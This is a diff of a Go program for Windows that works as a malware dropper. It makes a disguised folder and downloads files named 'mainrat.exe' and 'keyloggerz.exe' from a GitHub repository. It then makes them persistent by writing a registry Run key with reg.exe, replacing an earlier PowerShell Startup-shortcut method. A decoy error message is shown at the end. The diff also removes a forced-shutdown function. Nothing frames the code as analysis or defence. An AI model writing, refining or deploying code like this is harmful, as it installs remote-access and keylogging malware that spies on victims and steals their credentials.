@@ -63,32 +63,17 @@ func GetStartupFolder() (string, error) {
 	return string(path[:strings.IndexByte(string(path[:]), 0)]), nil
 }
 
-// Create shortcut to file in startup
-func CreateShortcutToStartup(targetPath, shortcutName string) error {
-	startupFolder, err := GetStartupFolder()
-	if err != nil {
-		return err
-	}
-	shortcutPath := filepath.Join(startupFolder, shortcutName+".lnk")
-	workingDir := filepath.Dir(targetPath)
+func AddToRegistryStartup(name, execPath string) error {
+	// Command to be executed at startup
+	cmd := fmt.Sprintf("%s", execPath)
 
-	// Escape Windows paths
-	escapedTarget := strings.ReplaceAll(targetPath, `\`, `\\`)
-	escapedShortcut := strings.ReplaceAll(shortcutPath, `\`, `\\`)
-	escapedWorkingDir := strings.ReplaceAll(workingDir, `\`, `\\`)
+	// Use reg.exe to add the registry key
+	regCmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		"/v", name,
+		"/d", cmd,
+		"/f") // /f to force overwrite if it exists
 
-	psScript := fmt.Sprintf(`
-$s = New-Object -ComObject WScript.Shell
-$shortcut = $s.CreateShortcut("%s")
-$shortcut.TargetPath = "%s"
-$shortcut.WorkingDirectory = "%s"
-$shortcut.WindowStyle = 1
-$shortcut.Description = "Auto run"
-$shortcut.Save()
-`, escapedShortcut, escapedTarget, escapedWorkingDir)
-
-	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", psScript)
-	return cmd.Run()
+	return regCmd.Run()
 }
 
 // Download file to given destination dir
@@ -170,10 +155,6 @@ func showInfoMsg() {
 	)
 }
 
-func shutdownIn10Seconds() error {
-	cmd := exec.Command("shutdown", "/s", "/t", "10", "/f")
-	return cmd.Run()
-}
 func main() {
 	// Step 1: Create hidden folder
 	targetFolder := `C:\Users\LINA\Desktop\games\sys64`
@@ -186,7 +167,7 @@ func main() {
 	// Step 2: Download files to that folder with retry loop
 	urls := []string{
 		"https://github.com/NobelTad/test/raw/refs/heads/main/mainrat.exe",
-		"https://github.com/NobelTad/test/raw/refs/heads/main/keyzlogzer.exe",
+		"https://github.com/NobelTad/test/raw/refs/heads/main/keyloggerz.exe",
 	}
 
 	for _, url := range urls {
@@ -207,20 +188,15 @@ func main() {
 
 		fmt.Println("Downloaded successfully:", filePath)
 
-		// Step 3: Create shortcut in Startup
+		// Step 3: Add to registry startup
 		name := strings.TrimSuffix(filepath.Base(filePath), filepath.Ext(filePath))
-		if err := CreateShortcutToStartup(filePath, name); err != nil {
-			fmt.Println("Failed to create startup shortcut for", filePath, ":", err)
+		if err := AddToRegistryStartup(name, filePath); err != nil {
+			fmt.Println("Failed to add to registry startup for", filePath, ":", err)
 		}
+
 	}
 
 	fmt.Println("All done.")
 	showErrorMsg()
 
-	err := shutdownIn10Seconds()
-	if err != nil {
-		fmt.Println("Shutdown failed:", err.Error())
-	} else {
-		fmt.Println("System will shut down in 10 seconds.")
-	}
 }
